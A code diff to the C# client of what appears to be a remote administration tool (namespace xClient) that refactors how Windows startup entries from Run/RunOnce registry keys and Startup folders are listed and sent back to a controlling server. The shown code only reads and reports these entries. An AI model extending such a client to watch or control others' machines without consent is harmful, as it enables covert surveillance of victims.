@@ -606,35 +606,47 @@ namespace xClient.Core.Commands
 
 				using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
 				{
-					for (int i = 0; i < key.GetValueNames().Length; i++)
-						startupItems.Add(string.Format("{0}||{1}", key.GetValueNames()[i], key.GetValue(key.GetValueNames()[i])), 0);
+					if (key != null)
+					{
+						foreach (var k in key.GetValueNames())
+							startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 0);
+					}
 				}
 				using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false))
 				{
-					for (int i = 0; i < key.GetValueNames().Length; i++)
-						startupItems.Add(string.Format("{0}||{1}", key.GetValueNames()[i], key.GetValue(key.GetValueNames()[i])), 1);
+					if (key != null)
+					{
+						foreach (var k in key.GetValueNames())
+							startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 1);
+					}
 				}
 				using (var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
 				{
-					for (int i = 0; i < key.GetValueNames().Length; i++)
-						startupItems.Add(string.Format("{0}||{1}", key.GetValueNames()[i], key.GetValue(key.GetValueNames()[i])), 2);
+					if (key != null)
+					{
+						foreach (var k in key.GetValueNames())
+							startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 2);
+					}
 				}
 				using (var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false))
 				{
-					for (int i = 0; i < key.GetValueNames().Length; i++)
-						startupItems.Add(string.Format("{0}||{1}", key.GetValueNames()[i], key.GetValue(key.GetValueNames()[i])), 3);
+					if (key != null)
+					{
+						foreach (var k in key.GetValueNames())
+							startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 3);
+					}
 				}
 				if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
 				{
 					var files = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
-					for (int i = 0; i < files.Length; i++)
-						startupItems.Add(string.Format("{0}||{1}", files[i].Name, files[i].FullName), 4);
+					foreach (var file in files)
+						startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 4);
 				}
 				if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
 				{
 					var files = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
-					for (int i = 0; i < files.Length; i++)
-						startupItems.Add(string.Format("{0}||{1}", files[i].Name, files[i].FullName), 5);
+					foreach (var file in files)
+						startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 5);
 				}
 
 				new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
